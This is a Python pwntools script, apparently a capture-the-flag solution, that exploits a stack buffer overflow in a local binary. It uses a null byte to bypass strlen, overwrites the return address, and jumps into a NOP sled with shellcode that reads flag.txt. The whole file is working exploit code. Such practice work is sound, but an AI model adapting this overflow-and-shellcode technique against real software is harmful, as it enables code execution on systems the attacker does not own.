import pwn

pwn.context.arch = 'amd64'

sh = pwn.process('./pwn')


def inject_shellcode():
    # Target: 60 bytes
    # 8 bytes: (fake input)
    # 1 byte: (null to fool strlen)
    # 51 bytes: (padding)
    # ---
    # 8 bytes: jump to shell code address
    # ---
    # 100 bytes: (no ops)
    # ? bytes: (shellcode)

    # pwn.cyclic_len('aaao')
    # 0x7fffffffcea8 ◂— 0x90909000007fffff
    # 0x7fffffffcea8 —▸ 0x55555555519b (main+203) ◂— test   eax, eax
    ret_addr_padding = 0x38

    payload = b'12345678' + b'\0';

    padding = ret_addr_padding - len(payload)
    payload += pwn.cyclic(padding)

    # [stack]         0x7fffffffcf79 0x6161616261616161 ('aaaabaaa')
    # real buffer addr at 0x7fffffffcf79?

    # buffer_addr = 0x7fffffffcf20
    # buffer_addr = 0x7fffffffce70
    buffer_addr = 0x7fffffffcf79
    sh_code_addr = buffer_addr + len(payload) # Throw it into the no-ops
    payload += pwn.p64(sh_code_addr)

    # rip = 0x7fffffffcea8

    payload += pwn.asm(pwn.shellcraft.nop()) * 8

    # # Since we are using `gets`, `stdin` mustbe re-opened if we want to use it
    # # Instead let's just `cat` the file
    sh_code = pwn.shellcraft.cat('flag.txt')
    sh_code += pwn.shellcraft.exit(0)

    # sh_code = pwn.shellcraft.infloop()

    # p = pwn.run_assembly(sh_code)
    # print(p.recvall())

    sh_code = pwn.asm(sh_code)
    sh_code = pwn.encoder.line(sh_code)

    payload += sh_code
    print('Payload len: ', len(payload))

    return payload


payload = inject_shellcode()

with open('payload', 'wb') as f:
    f.write(payload)

sh.send(payload)
# print(sh.recvall())
sh.interactive()
